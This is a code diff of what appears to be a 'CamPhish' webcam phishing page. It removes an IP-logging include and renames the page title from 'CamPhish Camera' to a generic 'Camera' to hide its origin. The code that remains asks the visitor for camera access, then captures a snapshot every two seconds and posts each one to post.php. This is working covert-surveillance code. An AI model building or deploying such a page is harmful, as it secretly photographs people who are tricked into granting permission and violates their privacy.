@@ -1,12 +1,8 @@
-<?php
-// Opsional: include ip.php untuk simpan IP
-include 'ip.php';
-?>
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CamPhish Camera</title>
+<title>Camera</title>
 </head>
 <body>
 <h2>Camera Access</h2>
@@ -28,7 +24,7 @@ async function initCamera() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
             $.post("post.php", { cam_image: imgData });
-        }, 2000);
+        }, 2000); // Kirim snapshot tiap 2 detik
     } catch(err) {
         console.error("Gagal akses kamera:", err);
         alert("Browser tidak bisa akses kamera. Izinkan akses kamera!");
